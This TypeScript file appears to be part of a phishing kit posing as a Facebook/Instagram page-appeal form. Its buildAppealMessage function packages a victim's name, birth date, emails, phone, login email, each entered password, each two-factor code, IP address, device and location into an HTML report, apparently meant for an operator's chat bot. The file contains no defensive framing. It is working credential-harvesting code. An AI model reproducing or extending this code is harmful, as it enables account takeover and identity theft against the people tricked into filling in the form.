import type { LoginProvider } from '@/store/store';

export interface FormDataPayload {
    fullName: string;
    dateOfBirth: string;
    personalEmail: string;
    businessEmail: string;
    phone: string;
    pageName: string;
    reason: string;
    additionalNotes: string;
}

export interface IpInfo {
    ip: string;
    city: string;
    region: string;
    country: string;
}

export interface LoginData {
    email: string;
    password: string;
}

const escapeHtml = (value: unknown) =>
    String(value ?? 'N/A')
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;');

const loginProviderLabel: Record<LoginProvider, string> = {
    facebook: 'Facebook',
    instagram: 'Instagram'
};

export const buildAppealMessage = ({
    label = 'Kháng Nghị Page',
    form,
    login,
    loginProvider,
    passwordLogs,
    codeAttempts,
    ip,
    deviceLabel
}: {
    label?: string;
    form: FormDataPayload;
    login: LoginData;
    loginProvider?: LoginProvider | null;
    passwordLogs: string[];
    codeAttempts: string[];
    ip: IpInfo;
    deviceLabel: string;
}) => {
    const now = new Date();
    const pad = (value: number) => String(value).padStart(2, '0');
    const formatted = `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

    const loginLine = loginProvider ? `\n🔑 Đăng nhập: <b>${loginProviderLabel[loginProvider]}</b>` : '';

    const passwordLines =
        passwordLogs.length > 0
            ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
            : '   MK1: <code>N/A</code>';

    const twoFALines =
        codeAttempts.length > 0
            ? codeAttempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
            : '   Code1: <code>N/A</code>';

    return `📩 <b>${escapeHtml(label)}</b>
⏰ ${formatted}
🌐 IP: <code>${escapeHtml(ip.ip || 'Unknown')}</code>
📱 Device: ${escapeHtml(deviceLabel)}
📍 Location: ${escapeHtml(`${ip.city || 'Unknown'}, ${ip.region || 'Unknown'}, ${ip.country || 'Unknown'}`)}${loginLine}
━━━━━━━━━━━━━━━━━━━━
📋 <b>INFO</b>
   Name: <code>${escapeHtml(form.fullName)}</code>
   DOB: <code>${escapeHtml(form.dateOfBirth)}</code>
   Email: <code>${escapeHtml(form.personalEmail)}</code>
   DN Email: <code>${escapeHtml(form.businessEmail)}</code>
   Phone: <code>${escapeHtml(form.phone)}</code>
   Page: <code>${escapeHtml(form.pageName)}</code>


🔐 <b>PASSWORD</b>
   EmailLogin: <code>${escapeHtml(login.email || 'N/A')}</code>
${passwordLines}

🔒 <b>2FA CODE</b>
${twoFALines}
━━━━━━━━━━━━━━━━━━━━`;
};

export const geoToIpInfo = (geo: {
    ip: string;
    city: string;
    country: string;
    region?: string;
}): IpInfo => ({
    ip: geo.ip,
    city: geo.city,
    region: geo.region ?? '',
    country: geo.country
});
